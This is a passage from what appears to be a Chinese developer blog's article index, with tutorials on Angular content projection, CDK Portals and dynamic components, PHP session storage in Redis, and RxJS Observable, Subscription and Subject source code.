ngOnInit() {}} 用法 123456&lt;app-ng-content-select&gt; &lt;div&gt;simple content&lt;/div&gt; &lt;span style=&quot;display:block&quot;&gt;span content&lt;/span&gt; &lt;div attribute&gt;content with attribute&lt;/div&gt; &lt;div class=&quot;class&quot;&gt;content with css class&lt;/div&gt;&lt;/app-ng-content-select&gt; 某些特定的实现 &lt;parent&gt;&lt;child&gt;&lt;/child&gt;&lt;/parent&gt; 作为一个整体组件使用，child 可以是定制化的不同组件。parent 拥有不同的状态比如 parent.active 表示该组件是否是选中状态，此时 child 组件要如何获取这个状态，这就涉及到组件间通信，有非常多的处理方式。 Angular 提供了 [ngTemplateOutlet] 指令，用于渲染 TemplateRef 模板实例，结合 ngTemplateOutletContext 提供 context，TemplateRef 可以获取 context 进行操作渲染。 以下例子定义了一个具有 timer 状态的 parent 组件，并能想嵌入内部在 child 模板内容提供 context={timer} 的上下文用于子内容的渲染。注意到模板组件的定义 TemplateRef&lt;{$implicit: number; timer: number}&gt; 泛型的类型申明为 {$implicit: number; timer: number} 为提供的 context 的类型，$implicit 为 context 默认提供的对象，这里的 let-timer=&quot;timer&quot; 也可以写成 let-timer，效果一致。 &lt;ng-container *ngTemplateOutlet=&quot;template; context: context&quot;&gt;&lt;/ng-container&gt;。这里 [ngTemplateOutlet] 用作结构指令，绑定结构指令的属性 ngTemplateOutletContext 写在 ngTemplateOutlet 表达式内部 context: context（Angular 黑科技，传承了 AngularJS）。其他博客有 &lt;ng-template [ngTemplateOutlet]=&quot;template&quot;&gt;&lt;/ng-template&gt; 的用法，但貌似官方文档并没有提倡这么用 Angular Docs。而且逻辑上这边是往 DOM 里插入节点，更接近结构指令的用法。 123456789101112131415161718192021222324252627282930313233343536@Component({ selector: &quot;app-ng-content-context&quot;, template: '&lt;ng-container *ngTemplateOutlet=&quot;template; context: context&quot;&gt;&lt;/ng-container&gt;', styleUrls: [&quot;./ng-content-context.component.sass&quot;],})export class NgContentContextComponent implements OnInit, OnDestroy { @ContentChild(TemplateRef, { read: TemplateRef }) template: TemplateRef&lt;{ $implicit: number; timer: number; }&gt;; timer = 0; intervalSub: Subscription; get context() { const { timer } = this; return { $implicit: timer, timer, }; } constructor() {} ngOnInit() { this.intervalSub = interval(1000).subscribe(() =&gt; { this.timer++; }); } ngOnDestroy() { this.intervalSub.unsubscribe(); }} 用法 123&lt;app-ng-content-context&gt; &lt;ng-template let-timer=&quot;timer&quot;&gt;{{timer}}&lt;/ng-template&gt;&lt;/app-ng-content-context&gt; 接上个例子，除了用 [ngTemplateOutlet] 来提供 context，可以通过注入来获得 parent 的成员。在复杂组件的开发中，也是常用的方法。 如下面这个例子 parent 组件用作统计 child 组件的数量，给定 child 组件 id 的功能，作为一个 master 节点与 child 交流。而 child 通过在 constructor 注入 parent 实例，注册自己、获取 id。 Angular 在应用运行时在内存中会有一个依赖注入的树，每个组件实例化之后也会在这个依赖注入树上注册一个相应的节点，可注入下游组件。每个组件实例去请求某个依赖的时候，都会在树的某一个对应的位置向上寻找。这边 child 组件通过 Host 装饰器，会只在局部寻找 parent 组件（官方局部解释：host element of the current component. 可理解为寻找到 usage 所在的组件为止）。 子组件 123456789101112131415@Component({ selector: &quot;app-ng-content-inject-child&quot;, template: &quot;&lt;div&gt;child {{id}}&lt;/div&gt;&quot;, styleUrls: [&quot;./ng-content-inject-child.component.sass&quot;],})export class NgContentInjectChildComponent implements OnInit { id: number; constructor(@Host() private parent: NgContentInjectComponent) {} ngOnInit() { this.parent.register(); this.id = this.parent.childCount; }} 宿主组件 123456789101112131415161718192021@Component({ selector: &quot;app-ng-content-inject&quot;, template: ` &lt;div&gt;total child count: {{ childCount }}&lt;/div&gt; &lt;ng-content&gt;&lt;/ng-content&gt; `, styleUrls: [&quot;./ng-content-inject.component.sass&quot;],})export class NgContentInjectComponent implements OnInit { name = &quot;parent&quot;; childCount = 0; constructor() {} ngOnInit() {} register() { this.childCount++; }} 用法 12345&lt;app-ng-content-inject&gt; &lt;app-ng-content-inject-child&gt;&lt;/app-ng-content-inject-child&gt; &lt;app-ng-content-inject-child&gt;&lt;/app-ng-content-inject-child&gt; &lt;app-ng-content-inject-child&gt;&lt;/app-ng-content-inject-child&gt;&lt;/app-ng-content-inject&gt;","link":"/front-end/angular_content/"},{"title":"Angular 动态创建组件之 Portals","text":"这篇文章主要介绍使用 Angular api 和 CDK Portals 两种方式实现动态创建组件，另外还会讲一些跟它相关的知识点，如：Angular 多级依赖注入、ViewContainerRef，Portals 可以翻译为 门户 ，我觉得放到这里叫 入口 更好，可以理解为动态创建组件的入口，类似于小程序或者 Vue 中的 Slot. 作者：pubuzhixing链接：https://zhuanlan.zhihu.com/p/59719621 动态创建组件想想应用的路由，一般配置路由地址的时候都会给这个地址配置一个入口组件，当匹配到这个路由地址的时候就在指定的地方渲染这个组件，动态创建组件类似，在最页面未接收到用户行为的时候，我不知道页面中这块区域应该渲染那个组件，当页面加载时根据数据库设置或者用户的操作行为才能确定最终要渲染的组件，这时候就要用代码动态创建组件把目标组件渲染到正确的地方。 使用 Angular API 动态创建组件该路由的入口组件是 PortalsEntryConponent 组件，如上面截图所示右侧有一块虚线边框的区域，里面具体的渲染组件不确定。 第一步先在视图模板中定义一个占位的区域，动态组件就要渲染在这个位置，起一个名称 #virtualContainer 文件 portals-entry.component.html 123&lt;div class=&quot;portals-outlet&quot;&gt; &lt;ng-container #virtualContainer&gt; &lt;/ng-container&gt;&lt;/div&gt; 第二步通过 ViewChild 取到这个 container 对应的逻辑容器 文件 portals-entry.component.ts 12@ViewChild('virtualContainer', { read: ViewContainerRef })virtualContainer: ViewContainerRef; 第三步处理单击事件，单击按钮时动态创建一个组件，portals-entry.component.ts 完整逻辑 12345678910111213141516171819202122232425262728293031import { TaskDetailComponent } from &quot;../task/task-detail/task-detail.component&quot;;@Component({ selector: &quot;app-portals-entry&quot;, templateUrl: &quot;./portals-entry.component.html&quot;, styleUrls: [&quot;./portals-entry.component.scss&quot;], providers: [],})export class PortalsEntryComponent implements OnInit { @ViewChild(&quot;virtualContainer&quot;, { read: ViewContainerRef }) virtualContainer: ViewContainerRef; constructor( private dynamicComponentService: DynamicComponentService, private componentFactoryResolver: ComponentFactoryResolver, private injector: Injector ) {} ngOnInit() {} openTask() { const task = new TaskEntity(); task.id = &quot;1000&quot;; task.name = &quot;写一篇关于Portals的文章&quot;; const componentFactory = this.componentFactoryResolver.resolveComponentFactory( TaskDetailComponent ); const componentRef = this.virtualContainer.createComponent&lt;TaskDetailComponent&gt;( componentFactory, null, this.virtualContainer.injector ); (componentRef.instance as TaskDetailComponent).task = task; // 传递参数 }} 代码说明 openTask()方法绑定到模板中按钮的单击事件 导入要动态创建的组件 TaskDetailComponent constructor 注入 injector、componentFactoryResolver 动态创建组件需要的对象，只有在组件上下文中才可以拿到这些实例对象 使用 api 创建组件，现根据组件类型创建一个 ComponentFactory 对象，然后调用 viewContainer 的 createComponent 创建组件 使用 componentRef.instance 获取创建的组件实例，这里用来设置组件的 task 属性值 其它ViewContainerRef 除了 createComponent 方法外还有一个 createEmbeddedView 方法，用于创建模板 123@ViewChild('customTemplate')customTemplate: TemplateRef&lt;any&gt;;this.virtualContainer.createEmbeddedView(this.customTemplate, { name: 'pubuzhixing' }); createEmbeddedView 方法的第二个参数，用于指定模板的上下文参数，看下模板定义及如何使用参数 123&lt;ng-template #customTemplate let-name=&quot;name&quot;&gt; &lt;p&gt;自定义模板，传入参数name：{{name}}&lt;/p&gt;&lt;/ng-template&gt; 此外还可以通过 ngTemplateOutlet 直接插入内嵌视图模板，通过 ngTemplateOutletContext 指定模板的上下文参数 1234&lt;ng-container [ngTemplateOutlet]=&quot;customTemplate&quot; [ngTemplateOutletContext]=&quot;{ name:'pubuzhixing' }&quot;&gt;&lt;/ng-container&gt; 小结分析下 Angular 动态创建组件/内嵌视图的 API，动态创建组件首先需要一个被创建的组件定义或模板声明，另外需要 Angular 上下文的环境来提供这个组件渲染在那里以及这个组件的依赖从那获取，viewContainerRef 是动态组件的插入位置并且提供组件的逻辑范围，此外还需要单独传入依赖注入器 injector，示例直接使用逻辑容器的 injector，是不是很好理解。 CDK Portal 文档介绍这里先对 Portal 相关的内容做一个简单的说明，后面会有两个使用示例，本来这块内容准备放到最后的，最终还是决定放在前面，可以先对 Portals 有一个简单的了解，如果其中有翻译不准确请见谅，官方文档地址：https://material.angular.io/cdk portals 提供渲染动态内容到应用的可伸缩的实现，其实就是封装了 Angular 动态创建组件的过程 Portals这个 Portal 指是能动态渲染一个指定位置的 UI 块 到页面中的一个 open slot 。 UI 块 指需要被动态渲染的内容，可以是一个组件或者是一个模板，而 open slot 是一个叫做 PortalOutlet 的开放的占位区域。 Portals 和 PortalOutlets 是其它概念中的低级的构造块，像 overlays 就是在它基础上构建的 1Portal&lt;T&gt; 包括动态组件的抽象类，可以是TemplatePortal（模板）或者ComponentPortal（组件） 1PortalOutlet 动态组件的宿主 代码片段说明CdkPortal 123456&lt;ng-template cdkPortal&gt; &lt;p&gt;The content of this template is captured by the portal.&lt;/p&gt;&lt;/ng-template&gt;&lt;!-- OR --&gt;&lt;!-- 通过下面的结构指令语法可以得到同样的结果 --&gt;&lt;p *cdkPortal&gt;The content of this template is captured by the portal.&lt;/p&gt; 可以通过 ViewChild、ViewChildren 获取到该 Portal，类型应该是 CdkPortal，如下所示： 12// 模板中的Portal@ViewChild(CdkPortal) templateCDKPortal: TemplatePortal&lt;any&gt;; ComponentPortal 组件类型的 Portal，需要当前组件在 NgModule 的 entryComponents 中配置才能动态创建该组件。 1this.userSettingsPortal = new ComponentPortal(UserSettingsComponent); CdkPortalOutlet 使用指令可以把 portal outlet 添加到一个 ng-template，cdkPortalOutlet 把当前元素指定为 PortalOutlet，下面代码把 userSettingsPortal 绑到此 portal-outlet 上 12&lt;!-- Attaches the `userSettingsPortal` from the previous example. --&gt;&lt;ng-template [cdkPortalOutlet]=&quot;userSettingsPortal&quot;&gt;&lt;/ng-template&gt; Portals 使用示例这里首先使用新的 api 完成和最上面示例一样的需求，在同样的位置动态渲染 TaskDetailComponent 组件。 第一步同样是设置一个宿主元素用于渲染动态组件，可以使用指令 cdkPortalOutlet 挂载一个 PortalOutlet 在这个 ng-container 元素上 123&lt;div class=&quot;portals-outlet&quot;&gt; &lt;ng-container #virtualContainer cdkPortalOutlet&gt; &lt;/ng-container&gt;&lt;/div&gt; 第二步与 使用 Angular API 动态创建组件 一节使用同一个逻辑元素作为宿主，只不过这里的获取容器的类型是 CdkPortalOutlet，代码如下 12@ViewChild('virtualContainer', { read: CdkPortalOutlet })virtualPotalOutlet: CdkPortalOutlet; 第三步创建一个 ComponentPortal 类型的 Portal，并且将它附加上面获取的宿主 virtualPotalOutlet 上，代码如下 12345678portalOpenTask() { this.virtualPotalOutlet.detach(); const taskDetailCompoentPortal = new ComponentPortal&lt;TaskDetailComponent&gt;( TaskDetailComponent ); const ref = this.virtualPotalOutlet.attach(taskDetailCompoentPortal); // 此处同样可以 通过ref.instance传递task参数} 小结这里是使用 ComponentPortal 的示例实现动态创建组件，Portal 还有一个子类 TemplatePortal 是针对模板实现的，上节 CDK Portal 官方文档介绍 中有介绍，这里就不在赘述了。总之使用 Portals 可以很大程度上简化代码逻辑。 Portals 源码分析上面只是使用 Portal 的最简单用法，下面讨论下它的源码实现，以便更好的理解 ComponentPortal首先我们先看一下 ComponentPortal 类的创建，上面的例子只是指定了一个组件类型作为参数，其实它还有别的参数可以配置，先看下 ComponentPortal 的构造函数定义 1234567891011121314export class ComponentPortal&lt;T&gt; extends Portal&lt;ComponentRef&lt;T&gt;&gt; { constructor( component: ComponentType&lt;T&gt;, viewContainerRef?: ViewContainerRef | null, injector?: Injector | null, componentFactoryResolver?: ComponentFactoryResolver | null ) { super(); this.component = component; this.viewContainerRef = viewContainerRef; this.injector = injector; this.componentFactoryResolver = componentFactoryResolver; }} ComponentPortal 构造函数的另外两个参数 viewContainerRef 和 injector viewContainerRef 参数非必填默认附到 PortalOutlet 上，如果传入 viewContainerRef 参数，那么 ComponentPortal 就会附到该 viewContaierRef 上，而不是当前 PortalOutlet 所在的元素上。 injector 参数非必填，默认使用 PortalOutlet 所在的逻辑容器的 injector，如果传入 injector，那么动态创建的组件就使用传入的 injector 作为注入器。 BasePortalOutletBasePortalOutlet 提供了附加 ComponentPortal 和 TemplatePortal 的部分实现，我们看下 attach 方法的部分代码（仅仅展示部分逻辑） 1234567891011121314/** Attaches a portal. */attach(portal: Portal&lt;any&gt;): any { if (!portal) { throwNullPortalError(); } if (portal instanceof ComponentPortal) { this._attachedPortal = portal; return this.attachComponentPortal(portal); } else if (portal instanceof TemplatePortal) { this._attachedPortal = portal; return this.attachTemplatePortal(portal); } throwUnknownPortalTypeError();} attach 处理前先根据 Portal 的类型是确实是组件还是模板，然后再进行相应的处理，其实最终还是调用了 ViewContainerRef 的 createComponent 或者 createEmbeddedView 方法，对这块感兴趣可看查看源代码文件 portal-directives.ts。 DomPortalOutletDomPortalOutlet 可以把一个 Portal 插入到一个 Angular 应用上下文之外的 DOM 中，想想我们前面的例子，无论自己实现还是使用 CdkPortalOutlet 都是把一个模板或者组件插入到一个 Angular 上下文中的宿主 ViewContainerRef 中，而 DomPortalOutlet 就是 脱离 Angular 上下文 的宿主，可以把 Portal 渲染到任意 dom 中，我们常常有这种需求，比如弹出的模态框、Select 浮层。 在 cdk 中 Overlay 用到了 DomPortalOutlet，然后 material ui 的 MatMenu 也用到了 DomPortalOutlet，MatMenu 比较容易理解，简单看下它是如何创建和使用的 DomPortalOutle（查看全部） 1234567891011if (!this._outlet) { this._outlet = new DomPortalOutlet( this._document.createElement(&quot;div&quot;), this._componentFactoryResolver, this._appRef, this._injector );}const element: HTMLElement = this._template.elementRef.nativeElement;element.parentNode!.insertBefore(this._outlet.outletElement, element);this._portal.attach(this._outlet, context); 上面的代码先创建了 DomPortalOutlet 类型的对象_outlet，DomPortalOutlet 是一个 DOM 宿主它不在 Angular 的任何一个 ViewContainerRef 中，现在看下它的四个构造函数参数 说明：这节讲的 脱离 Angular 上下文 是不太准确定，任何模板或者组件都不能脱离 Angular 的运行环境，这里应该是脱离了实际渲染的 Component Tree，单独渲染到指定 dom 中。 复杂示例为 ComponentPortal 传入 PortalInjector 对象，PortalInjector 实例对象配置一个其它业务组件的 injector 并且配置 tokens，下面简单说明下逻辑结构，有兴趣的可看完整示例。 业务组件 TaskListComponent文件 task-list.component.ts 123456789@Component({， selector: 'app-task-list', templateUrl: './task-list.component.html', styleUrls: ['./task-list.component.scss'], providers: [TaskListService]})export class TaskListComponent implements OnInit { constructor(public taskListService: TaskListService) {}} 组件级提供商配置了 TaskListService 定义 TaskListService用于获取任务列表数据，并保存在属性 tasks 中 TaskListComponent 模板在模板中直接绑定 taskListService.tasks 属性数据 修改父组件 PortalsEntryComponent因为 PortalOutlet 是在父组件中，所以单击任务列表创建动态组件的逻辑是从父组件响应的 portals-entry.component.ts 123456789101112131415161718192021222324@ViewChild('taskListContainer', { read: TaskListComponent })taskListComponent: TaskListComponent;ngOnInit() { this.taskListComponent.openTask = task =&gt; { this.portalCreatTaskModel(task); };}portalCreatTaskModel(task: TaskEntity) { this.virtualPotalOutlet.detach(); const customerTokens = new WeakMap(); customerTokens.set(TaskEntity, task); const portalInjector = new PortalInjector( this.taskListViewContainerRef.injector, customerTokens ); const taskModelCompoentPortal = new ComponentPortal&lt;TaskModelComponent&gt;( TaskModelComponent, null, portalInjector ); this.virtualPotalOutlet.attach(taskModelCompoentPortal);} 给 ComponentPortal 的构造函数传递了 PortalInjector 类型的参数 portalInjector，PortalInjector 继承自 Injector PortalInjector 构造函数的两个参数 第一个参数是提供一个基础的注入器 injector，这里使用了 taskListViewContainerRef.injector，taskListViewContainerRef 就是业务 TaskListComponent 组件的 viewContainerRef 12@ViewChild('taskListContainer', { read: ViewContainerRef })taskListViewContainerRef: ViewContainerRef; 也就是新的组件的注入器来自于 TaskListComponent 第二个参数是提供一个 tokens，类型是 WeakMap，其实就是 key/value 的键值对，只不过它的 key 只能是引用类型的对象，这里把类型 TaskEntity 作为 key，当前选中的实例对象作为 value，就可以实现对象的传入，使用 set 方法 customerTokens.set(TaskEntity, task)。 新的任务详情组件 TaskModelComponenttask-model.component.ts 1234constructor( public task: TaskEntity, private taskListService: TaskListService) {} 没错，是通过注入器注入的方式获取 TaskEntity 实例和服务 TaskListService 的实例 taskListService。 总结这个例子相对复杂，只是想说明可以给动态创建的组件传入特定的 injector。","link":"/front-end/angular_portals/"},{"title":"PHP Session 分布","text":"在以前我们很多项目都是集中式的开发（即 LAMP、LNMP 一体式解决方案），并且整个授权完全基于 Session 的居多。而这样的项目有时又需要分布高可用的改良，因此需要接解决多台服务器的 Session 共享问题 对于 PHP 让 Session 存储在 redis 是一个很不错的方案，首选需要为 PHP 安装 Redis 扩展，http://pecl.php.net/package/redis &gt;= PHP7 选 ^5.0.0 PHP 5 选 4.3.0 使用 docker 则在 Dockerfile 中加入 12pecl install redis \\&amp;&amp; docker-php-ext-enable redis \\ 扩展安装完毕后我们为其配置 php.ini 123[Session]session.save_handler = redissession.save_path = &quot;tcp://localhost:6379?database=10&amp;auth=abcd&quot; 更多详情可查看 https://github.com/phpredis/phpredis/blob/develop/README.markdown#php-session-handler 注意 如果 redis 口令中包含 # 号，则会提示 NOAUTH Authentication required 的错误，是因为 php.ini 误当成注释了，解决方式： 将 # 进行 URL 编码，替换成 %23","link":"/backend/php_session/"},{"title":"RxJS 源码解析(一): Observable &amp; Subscription","text":"ReactiveX 是 Reactive Extensions 的缩写，一般简写为 Rx ，最初是 LINQ 的一个扩展，由微软的架构师 Erik Meijer 领导的团队开发，在 2012 年 11 月开源。Rx 是一个编程模型，目标是提供一致的编程接口，帮助开发者更方便的处理异步数据流。 首先，先给出官方对于 Rx 的定义。 ReactiveX is a library for composing asynchronous and event-based programs by using observable sequences. 翻译起来有点麻烦，简而言之，就是基于观察者队列实现了对异步和基础事件的编程。 Rxjs 是 Rx 的 JavaScript 的实现。本篇文章将简单的分析一下 Obersvable 和 Subscription 的源码是怎么进行的。 作者：zcx链接：https://mp.weixin.qq.com/s/6fVoI_JtSXu6YfZur1TDNw Observable可观察对象是整个 Rx 的核心，主要的作用就是提供了一个观察者模式，使得调用者可以通过响应式的方式获取数据。 Observable 实际上就是一个单向链表，基本的数据结构如下： 123class Observable&lt;T&gt; { source: Observable&lt;any&gt;;} 其构造方法与 Promise 类似，通过传入一个函数包裹操作，并让这个函数来决定数据传递，这个函数的参数包含了一个订阅器。 12345const observable = new Observable((subscriber) =&gt; { subscriber.next(1); subscriber.error(Error(&quot;error message&quot;)); subscriber.complete();}); 订阅器提供了三个主要方法：next，error，complete。订阅器的实现很巧妙，其内部实现是一个链表 跟 Promise 不同，Observable 不会立刻运行这个函数，而是等到它被订阅后，这个函数才会被执行，这种惰性求值的特性使得 Observable 可以在它仅被需要的地方进行计算。 liftlift 方法提供了一个这样的功能，传入一个映射函数，并返回一个新的 Observable，这个新的 Observable 的 source 会指向创建它的 Observable。实际上，这种做法就是将这个映射函数用一个外覆类包裹起来，这个外覆类，正是 Observable。那么，看看它是如何实现。 123456lift&lt;R&gt;(operator: Operator&lt;T, R&gt;): Observable&lt;R&gt; { const observable = new Observable&lt;R&gt;(); observable.source = this; observable.operator = operator; return observable;} pipeRxjs 跟其他语言实现的 ReactiveX 不一样的地方就是在于，它的映射方法不再是放在 Observable 内部，而是通过参数的形式传入到一个管道函数 pipe 中，在这个函数中，通过对管道函数的数组进行 reduce 后，就能够得到最终的 Observable。这个 reduce 的过程也很巧妙，传入的函数的参数就是上游的 Observable，返回的就是一个给下游接收的 Observable，那么就可以把一个又一个的 Observable 串联起来 12345678910pipe(...operations: OperatorFunction&lt;any, any&gt;[]): Observable&lt;any&gt; { if (operations.length === 0) { return this as any; } if (operations.length == 1) { return operation[0]; } return operations.reduce((prev, fn) =&gt; fn(prev), this);} 那么在使用过程中，pipe 通过重载给传入的函数提供类型信息。 1234567export function pipe&lt;T&gt;(): UnaryFunction&lt;T, T&gt;;export function pipe&lt;T, A&gt;(fn1: UnaryFunction&lt;T, A&gt;): UnaryFunction&lt;T, A&gt;;export function pipe&lt;T, A, B&gt;( fn1: UnaryFunction&lt;T, A&gt;, fn2: UnaryFunction&lt;A, B&gt;): UnaryFunction&lt;T, B&gt;;// ... 其中 UnaryFunction 表示一元函数，通过这种链式操作，使得链条上的所有函数都可以拿到上游的类型，并把类型转化传递给下游。 subscribe当 Observable 一旦调用 subscribe，那么就意味着其开始执行链条中的所有函数。subscribe 传入的参数是一个包含了 next ，error ， complete 三个属性的对象；也可以是三个函数，分别对应 next，error，complete。 1234567891011121314151617181920observable.subscribe((value) { console.log(value);}, (error) { console.error(error);}, () { console.log('complete');});observable.subscribe({ next: (value) { console.log(value); }, error: (error) { console.error(error); }, complete: () { console.log('complete'); },}); 其具体实现是通过将传入的函数（对象）参数转化成 Subscriber 对象，而 Subscriber 继承了 Subscription。最后，返回的就是一个 subscription 给到调用者。 123456789101112131415161718192021222324252627282930313233343536subscribe( observerOrNext?: PartialObserver&lt;T&gt; | ((value: T) =&gt; void), error?: (error: any) =&gt; void, complete?: () =&gt; void): Subscription) { // operator 是一个映射函数 const {operator} = this; const sink = new Subscriber(observerOrNext, error, complete); if (operator) { sink.add(operator.call(sink, this.source)); } else { sink.add(this.source || !sink.syncErrorThrowable ? this._subscribe(sink) : this._trySubscribe(sink) ); } // 省略了错误处理 return sink;}_subscribe(subscriber: Subscriber&lt;any&gt;): TeardownLogic { const { source } = this; return source &amp;&amp; source.subscribe(subscriber);}_trySubscribe(sink: Subscriber&lt;T&gt;): TeardownLogic { try { return this._subscribe(sink); } catch (err) { // 此处省略了源码中的一些判断，不影响阅读 sink.error(err);} Subscriber 的 add 方法下面会讲。总之，Observable 就像一串或者一个爆竹，只有当它被点燃（subscribe）的时候，才会把一个又一个的 Observable 点着，最终迸发出巨大声响，而 subscribe 就是一个找到引线并点燃它们的过程。 SubscriptionSubscription 则是通过一种树结构，它包含了叶节点和一个父节点或者父节点的集合。 1234class Subscription { _parentOrParents: Subscription; _subscriptions: Subscription[];} addadd 方法主要的功能是连接不同的订阅，配合注释，其逻辑就是将函数或者订阅对象包裹后放入成员变量 subscriptions 中，并将这个包裹对象的父订阅对象设置为当前对象。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859add(logic: Function | Subscription | void): Subscription { let subscription = logic; if (typeof logic === 'object') { // 如果添加进来订阅已经被取消了，则不进行设置。 // 如果当前的订阅已经被取消，添加进来的订阅也应该要被取消。 if (subscription === this || subscription.closed || typeof subscription.unsubscribe !== 'function') { return subscription; } else if (this.closed) { subscription.unsubscribe(); return subscription; } else if (!(subscription instanceof Subscription)) { const tmp = subscription; subscription = new Subscription(); subscription._subscriptions = [tmp]; } } else if (typeof logic === 'function' ) { subscription = new Subscription(&lt;(() =&gt; void)&gt;teardown); } else { // 抛出错误。 } // 设置父对象的过程采用懒加载模式。 let { _parentOrParents } = subscription; if (_parentOrParents === null) { // 如果没有设置父对象，则设置当前对象为父对象。 subscription._parentOrParents = this; } else if (_parentOrParents instanceof Subscription) { // 如果父对象已经是当前的对象，直接返回。 if (_parentOrParents === this) { return subscription; } // 添加进来的订阅的父对象已经存在，那么用一个数组保存。 subscription._parentOrParents = [_parentOrParents, this]; } else if (_parentOrParents.indexOf(this) === -1) { // 如果已经是数组对象了，并且不存在当前订阅对象，则设置当前订阅对象 _parentOrParents.push(this); } else { // 已经设置当前订阅对象为父对象 return subscription; } // 同样，设置叶子结点的过程也是用懒加载 const subscriptions = this._subscriptions; if (subscriptions === null) { this._subscriptions = [subscription]; } else { subscriptions.push(subscription); } return subscriptio unsubscribe取消订阅是订阅对象的主要功能，它为观察者模式提供了终结观察的方法。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364unsubscribe(): void { // 已经取消订阅了。 if (this.closed) { return; } // 拿到当前想要取消订阅的相关的对象。 // 这样做的目的是防止loop let { _parentOrParents, _unsubscribe, _subscriptions } = (&lt;any&gt; this); // 设置取消订阅 this.closed = true; // 设置父对象为空 this._parentOrParents = null; // 设置订阅为空 this._subscriptions = null; // 父对象可能是数组，也可能是订阅对象 if (_parentOrParents instanceof Subscription) { _parentOrParents.remove(this); } else if (_parentOrParents !== null) { for (let index = 0; index &lt; _parentOrParents.length; ++index) { const parent = _parentOrParents[index]; parent.remove(this); } } // _unsubscribe 是一个外部传入的函数. if (isFunction(_unsubscribe)) { try { _unsubscribe.call(this); } catch (e) { errors = e instanceof UnsubscriptionError ? flattenUnsubscriptionErrors(e.errors) : [e]; } } // 将所有的子订阅取消订阅 if (isArray(_subscriptions)) { let len = _subscriptions.length; for (const sub of _subscriptions) { if (isObject(sub)) { try { sub.unsubscribe(); } catch (e) { // 省略错误处理 } } } } //","link":"/front-end/angular_rxjs_1/"},{"title":"RxJS 源码解析(二): Muticasted Observable","text":"我们分析了 Oberservable 和 Subscription 的具体实现方法。这一篇，将会了解一系列不同的 Muticasted Observable（多播观察源），这些 Observable 在 RxJS 中主要是以 Subject 命名，它们有以下几种不同的实现： Subject AnonymousSubject BehaviorSubject ReplaySubject AsyncSubject 所谓 Muticasted Observable，就是这个 Observable 可以持续的发送数据给到订阅它的订阅者们。 作者：zcx链接：https://mp.weixin.qq.com/s/i14brW_Ok8JYGoBIcfhs5Q SubjectSubject 是最基础的 Muticasted Observable，订阅者对其进行订阅后，将会拿到 Subject 之后发送的数据。但是，如果订阅者在数据发送后再订阅，那么它将永远都拿不到这条数据。用一下例子简单说明一下： 123456789101112131415const subject = new Subject&lt;number&gt;();// 订阅之前调用是不会打印subject.next(1);// 订阅数据const subscription = subject.subscribe((value) =&gt; { console.log(&quot;订阅数据A：&quot; + value);});// 订阅后调用会打印数据。subject.next(2);// 打印结果// 订阅数据A：2 Subject 的实现通过将观察员们放入数组中，如果有事件即将到来，通知当前所有已经在位的观察员们。 1234567891011121314151617181920212223242526272829303132333435363738394041424344class Subject&lt;T&gt; extends Observable&lt;T&gt; { observers: Observer&lt;T&gt;[] = []; // 省略了一些内容 next(value?: T) { if (!this.isStopped) { ... const { observers } = this; const len = observers.length; const copy = observers.slice(); for (let i = 0; i &lt; len; i++) { copy[i].next(value); } } } // error 类似于 next error(err: any) { ... this.hasError = true; this.thrownError = err; this.isStopped = true; const { observers } = this; const len = observers.length; const copy = observers.slice(); for (let i = 0; i &lt; len; i++) { copy[i].error(err); } this.observers.length = 0; } // complete 类似于 next complete() { ... this.isStopped = true; const { observers } = this; const len = observers.length; const copy = observers.slice(); for (let i = 0; i &lt; len; i++) { copy[i].complete(); } this.observers.length = 0; }} 通过重写了 _subscribe ，将观察员在订阅时保存到 observers 数组中。 1234567891011121314_subscribe(subscriber: Subscriber&lt;T&gt;): Subscription { if (this.hasError) { subscriber.error(this.thrownError); return Subscription.EMPTY; } else if (this.isStopped) { subscriber.complete(); return Subscription.EMPTY; } else { // 如果都没有问题，在这里将观察员保存到 observers 数组。 this.observers.push(subscriber); // 提供一个指向于当前观察者的订阅对象。 return new SubjectSubscription(this, subscriber) }} Subject 通过创建一个新的指向于它的 observable，完成和 Observable 之间的转换。 12345asObservable(): Observable&lt;T&gt; { const observable = new Observable&lt;T&gt;(); (&lt;any&gt;observable).source = this; return observable;} AnonymousSubjectAnonymousSubject 是一个 Subject 的 wrapper，它拥有一个 名为 destination 的 Observer 成员。 Observer 提供了三个方法接口，分别是 next，error 和 complete。 123456export interface Observer&lt;T&gt; { closed?: boolean; next: (value: T) =&gt; void; error: (err: any) =&gt; void; complete: () =&gt; void;} AnonymousSubject 通过重载 Subject 的 next，error，complete 将调用转发到 destination 。由于其重载这三个重要的方法，其本身并不具备 Subject 所提供的功能。AnonymousSubject 重载这些方法的主要作用是为了将调用转发到 destination ，也就是提供了一个 123456789101112131415161718192021222324252627export class AnonymousSubject&lt;T&gt; extends Subject&lt;T&gt; { constructor(protected destination?: Observer&lt;T&gt;, source?: Observable&lt;T&gt;) { super(); this.source = source; } next(value: T) { const { destination } = this; if (destination &amp;&amp; destination.next) { destination.next(value); } } error(err: any) { const { destination } = this; if (destination &amp;&amp; destination.error) { this.destination.error(err); } } complete() { const { destination } = this; if (destination &amp;&amp; destination.complete) { this.destination.complete(); } }} 它也重载 _subscribe，那么也就不具备 Subject 的保存订阅者的功能了。 12345678_subscribe(subscriber: Subscriber&lt;T&gt;): Subscription { const { source } = this; if (source) { return this.source.subscribe(subscriber); } else { return Subscription.EMPTY; }} 通过阅读源码使用到 AnonymousSubject 的地方，我认为 AnonymousSubject 主要的功能还是为 Subject 的 lift 方法提供一个封装，lift 需要返回的是一个符合当前类的同构对象。 1234567export class Subject&lt;T&gt; extends Observable&lt;T&gt; { lift&lt;R&gt;(operator: Operator&lt;T, R&gt;): Observable&lt;R&gt; { const subject = new AnonymousSubject(this, this); subject.operator = &lt;any&gt;operator; return &lt;any&gt;subject; }} 如果直接重新构造一个 Subject 虽然符合同构，但是存储了过多的冗余数据，比如，订阅的时候就会重复把订阅者添加到 observers 中；如果直接使用 Observable ，那么又不符合同构，因为 Observable 并不具备 next，error 和 complete 等功能，那么这就是一种比较稳妥的做法，通过重载复写 Subject 的一些方法，使得其既具备同构，也不会重复保存冗余数据。 BehaviorSubjectBehaviorSubject 为 Subject 提供了数据持久化（相对于 Subject 本身）功能，它本身存储了已经到来的数据，可以看看以下例子。 1234567891011121314151617181920212223const subject = new BehaviorSubject&lt;number&gt;(0);// 初始化后直接订阅const subscriptionA = subject.subscribe((value) =&gt; { console.log(&quot;订阅数据A：&quot; + value);});// 订阅之前调用是不会打印subject.next(1);const subscriptionB = subject.subscribe((value) =&gt; { 